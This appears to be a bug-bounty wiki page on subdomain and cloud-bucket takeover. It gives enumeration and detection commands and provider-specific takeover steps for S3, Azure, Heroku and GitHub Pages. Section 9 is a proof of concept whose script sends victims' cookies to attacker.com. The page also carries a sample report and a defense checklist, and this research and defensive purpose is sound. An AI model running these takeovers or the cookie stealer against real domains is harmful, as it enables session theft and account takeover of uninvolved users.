---
type: wiki
category: attack
tool: subzy,dnsreaper,nuclei
status: active
last-updated: 2026-04-21
---

# Subdomain / Cloud Takeover Deep Dive (2026 Edition)

> **Purpose:** A dangling CNAME / unclaimed S3 bucket = P2-P1 (depending on how trusted the subdomain is). In 2026 AWS strengthened S3 bucket namespace reclaim protections, but Azure/GCP/Heroku/Fastly still have gaps. Taking over `apex.target.com` versus one scoped to a session cookie = full ATO.

## 0. 2026 Landscape

| Provider | 2026 status | Exploitability |
|----------|----------|---------|
| S3 | Has bucket namespace pre-claim protection (2022+) | Low, but legacy buckets can still be claimed |
| Azure Blob | Name can be re-claimed after release | Medium |
| Heroku | Subdomain can be directly re-claimed via `heroku apps:create` after release | High |
| GitHub Pages | Can be re-registered after user/repo deletion | High |
| Netlify / Vercel | Can be claimed | High |
| Fastly | **Requires an account and edge conditions**; officially classified `can-i-take-over-xyz` = Not Vulnerable | Very low |
| Shopify | Multi-layer verification (DNS TXT) | Low |
| Pantheon | Can be taken over | Medium |

Official reference table: https://github.com/EdOverflow/can-i-take-over-xyz

## 1. Finding Candidates

### 1.1 Enumerate all subdomains via DNS

```bash
# Passive (recommended, higher volume)
subfinder -d target.com -all -silent | tee all.txt
amass enum -passive -d target.com | tee -a all.txt
assetfinder target.com | tee -a all.txt
findomain -t target.com

# BBOT one-liner
bbot -t target.com -f subdomain-enum -o bbot-out

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### 1.2 Resolve → find CNAMEs / NXDOMAINs

```bash
# dnsx to check CNAMEs
cat all.txt | dnsx -cname -resp -silent | tee cnames.txt

# Extract CNAMEs pointing to external services
grep -E 'cname.*(s3|azurewebsites|cloudapp|herokuapp|herokussl|github\.io|netlify|vercel|pantheon|elasticbeanstalk|fastly)' cnames.txt
```

### 1.3 Find NXDOMAIN (CNAME points to a nonexistent host)

```bash
cat all.txt | dnsx -resp | grep NXDOMAIN
```

## 2. Automated Tools

### 2.1 subzy (fast)

```bash
go install -v github.com/LukaSikic/subzy@latest
subzy run --targets all.txt --concurrency 100 --hide_fails --verify_ssl
```

### 2.2 dnsReaper (most complete fingerprinting)

```bash
git clone https://github.com/punk-security/dnsReaper
cd dnsReaper
pip install -r requirements.txt
python3 main.py file --filename ../all.txt -o findings.json
```

### 2.3 Nuclei takeover templates

```bash
nuclei -l all.txt -tags takeover -silent
```

### 2.4 tko-subs

```bash
tko-subs -domains=all.txt -data=providers-data.csv
```

## 3. S3 Bucket Takeover

### 3.1 Detection

```bash
# CNAME points to s3.amazonaws.com or s3-website-xxx
dig cdn.target.com
# → cdn.target.com.s3.amazonaws.com

curl -sI https://cdn.target.com/
# → NoSuchBucket error = takeover possible
```

### 3.2 Takeover (2026 caveats)

```bash
# Try creating the bucket in the same region
aws s3 mb s3://cdn.target.com --region us-east-1

# Since 2022+ AWS has a namespace cooldown, most regions will reject this
# But legacy buckets can still succeed

# Upload a file
echo '<html><h1>owned</h1></html>' > index.html
aws s3 cp index.html s3://cdn.target.com/
aws s3 website s3://cdn.target.com/ --index-document index.html

# Verify
curl https://cdn.target.com/
```

### 3.3 S3 bucket enumeration (find public buckets)

```bash
# Even without a full takeover, there may be IDOR / data exposure
s3scanner scan -f bucket-list.txt
cloud_enum -k target
```

## 4. Azure Blob Takeover

### 4.1 Detection

```bash
# CNAME points to *.blob.core.windows.net
dig media.target.com
# → media.target.com.blob.core.windows.net

curl -sI https://media.target.com/
# → "The requested URI does not represent..." = takeover possible
```

### 4.2 Takeover

```bash
# Azure CLI
az storage account create \
  --name mediatarget \
  --resource-group my-rg \
  --location eastus \
  --sku Standard_LRS

# Custom domain
az storage account update \
  --name mediatarget \
  --custom-domain media.target.com
```

## 5. Heroku Takeover (high success rate)

```bash
# CNAME points to *.herokuapp.com or *.herokudns.com
dig app.target.com
# → app.target.com.herokuapp.com

curl https://app.target.com/
# → "No such app" = takeover possible
```

Takeover:

```bash
heroku login
heroku create app-target     # use the app name the CNAME points to
heroku domains:add app.target.com
git push heroku main
```

## 6. GitHub Pages Takeover

```bash
# CNAME points to user.github.io
dig blog.target.com
# → blog.target.com.oldcompany.github.io

curl https://blog.target.com/
# → "There isn't a GitHub Pages site here" = takeover possible
```

Takeover:

1. Register the GitHub user `oldcompany` or create the repo `oldcompany.github.io`
2. Add a `CNAME` file with content `blog.target.com`
3. Trigger a Pages build

## 7. Other Providers

### 7.1 Netlify / Vercel

```
curl → "Page Not Found" + Netlify logo = claimable
```

Netlify: `Domain Management → Add a custom domain → blog.target.com`.

### 7.2 Pantheon

```
curl → "The gods are wise, but do not know of the site which you seek"
```

### 7.3 Fastly (largely immune in 2026)

```
curl → "Fastly error: unknown domain"
```

However, `can-i-take-over-xyz` classifies this as **Not Vulnerable** (requires an account plus edge conditions). Unless you have a new PoC, **don't submit this** — large vendors will mark it N/A. A major brand's bug bounty program verified this in April 2026: it required a paid Fastly account to claim an arbitrary domain, making it impractical in real-world conditions.

### 7.4 Tumblr / Shopify / Zendesk

Most require DNS TXT verification and are already patched.

## 8. Apex / High-Trust Domain Attack Chains

### 8.1 Session cookie scope escalation

```
main.target.com → sets a cookie with Domain=.target.com
Attacker takes over random.target.com
→ injects an iframe/fetch into random.target.com
→ the session cookie, scoped to the same parent domain, gets sent along
→ can be read / overwritten
```

### 8.2 CORS allowlist bypass

If CORS whitelists `*.target.com`, taking over any subdomain lets you hit the main API.

### 8.3 OAuth `redirect_uri` bypass

If OAuth registers `*.target.com` as a valid redirect → taking over a subdomain lets you capture the code.

See [16-oauth-attack-chains.md](16-oauth-attack-chains.md) for details.

### 8.4 Cookie injection via subdomain

An attacker controlling sub.target.com can set a cookie with Domain=.target.com → overwriting the parent cookie (CSRF, session fixation).

## 9. Full PoC: Heroku Subdomain Takeover → Session Cookie Theft

### Step 1: Detection

```bash
$ dig oldapp.target.com
oldapp.target.com. 300 IN CNAME target-legacy.herokuapp.com.

$ curl -s https://oldapp.target.com/
There's nothing here, yet.
```

### Step 2: Takeover

```bash
heroku create target-legacy
heroku domains:add oldapp.target.com

# Build a simple app
echo 'console.log("owned")' > index.js
echo '{"name":"x","scripts":{"start":"node index.js"}}' > package.json
git init && git add . && git commit -m init
heroku git:remote -a target-legacy
git push heroku master
```

### Step 3: Deploy a session stealer

```js
// Deployed on the taken-over subdomain
<script>
  if (document.cookie) {
    fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie));
  }
</script>
```

### Step 4: Verify cookie scope

```bash
curl -b "sessionId=test" https://oldapp.target.com/
# If main.target.com's cookie Domain=.target.com → it will be sent here too
```

### Step 5: Report

```markdown
## Vulnerability Summary
The DNS CNAME for https://oldapp.target.com points to a released Heroku app,
`target-legacy.herokuapp.com`. Any attacker can re-register an app of the same
name on Heroku and take over this subdomain. Since target.com's session cookie
Domain is set to `.target.com`, this takeover can be used to steal the session
of any subdomain user, achieving account takeover.

## PoC
[3 steps: dig confirmation + heroku create + deploying a PoC page + cookie theft log]

## Impact
- Session theft for any user (scoped to *.target.com)
- High-trust phishing vector (a real subdomain)
- If CORS whitelists *.target.com → the internal API can be hit

## Severity
P1 / Critical (session cookie scoped to the parent domain)
P2 / High (pure subdomain takeover with no session impact)

## Remediation
1. Immediately remove the oldapp.target.com DNS CNAME
2. Or register a placeholder app on Heroku
3. Audit all DNS records against the actual infrastructure inventory
4. Set up dangling-record monitoring (scheduled dnsReaper runs)
5. Scope session cookies to specific subdomains, not the parent domain
```

## 10. Defense Checklist

```
1. Align DNS record lifecycle with infrastructure inventory
2. Remove DNS records before decommissioning a service, not after
3. Automate takeover scanning (scheduled subzy runs)
4. Scope session cookie Domain to specific subdomains where possible
5. Use exact-match CORS whitelists, not wildcards
6. OAuth redirect_uri must use exact match
7. Enable S3 bucket Block Public Access
8. Tag all cloud assets → batch-check when employees leave / projects end
```

## Related Documents

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth redirect_uri bypass
- [78-open-redirect.md](78-open-redirect.md) — Subdomain takeover combined with OAuth
- can-i-take-over-xyz: https://github.com/EdOverflow/can-i-take-over-xyz
- subzy: https://github.com/LukaSikic/subzy
- dnsReaper: https://github.com/punk-security/dnsReaper
- tko-subs: https://github.com/anshumanbh/tko-subs
- HackerOne historical takeover reports: https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md
